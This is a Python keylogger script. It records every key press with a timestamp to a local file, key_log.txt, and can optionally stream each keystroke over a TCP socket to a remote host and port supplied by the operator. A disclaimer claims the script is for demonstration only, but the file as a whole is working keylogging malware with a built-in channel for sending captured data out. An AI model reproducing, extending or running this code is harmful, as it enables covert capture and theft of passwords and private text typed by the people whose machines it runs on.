import logging
from pynput import keyboard
import socket
import os

# Reminder for Ethical Use
print("DISCLAIMER: This script is provided for demonstration purposes of the python programming language only.")
print("I am not responsible for any misuse or damage caused by this script.")

# Configure Logging to Save Key Presses
log_dir = ""  # Directory where the log file will be saved. Empty means the current directory.
log_file = os.path.join(log_dir, "key_log.txt")

# Check if log file exists, if not, create it
if not os.path.isfile(log_file):
    with open(log_file, 'w') as file:
        pass  # Just create the file

logging.basicConfig(
    filename=log_file,  # Name of the log file
    level=logging.DEBUG,  # Logging level to save all key presses
    format='%(asctime)s: %(message)s'  # Format to include timestamp and message in the log
)

# Configuration for netcat
enable_netcat = input("Do you want to enable netcat logging? (y/n): ").strip().lower() == 'y'
if enable_netcat:
    nc_host = input("Enter netcat host: ").strip()
    nc_port = int(input("Enter netcat port: ").strip())

def send_to_netcat(message):
    """
    Function to send a message to a remote PC via netcat.
    """
    if enable_netcat:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((nc_host, nc_port))
                s.sendall(message.encode())
        except Exception as e:
            logging.error(f"Failed to send data to netcat: {str(e)}")

def on_key_press(key):
    """
    Function to execute when a key is pressed.
    Logs the key press and does not print it to the console.
    """
    try:
        # Log the alphanumeric key pressed
        log_message = 'Key {0} pressed.'.format(key.char)
    except AttributeError:
        # Log the special key pressed (e.g., space, enter, etc.)
        log_message = 'Special key {0} pressed.'.format(key)
    
    logging.info(log_message)
    send_to_netcat(log_message)

def on_key_release(key):
    """
    Function to execute when a key is released.
    Stops the listener if the 'Escape' key is pressed.
    """
    if key == keyboard.Key.esc:
        # Log exit and stop the listener
        logging.info("Keylogger stopped by user.")
        return False

# Inform the user about the escape functionality
print("Press the 'Escape' key to stop the keylogger.")

# Start Listening to the Keyboard
with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()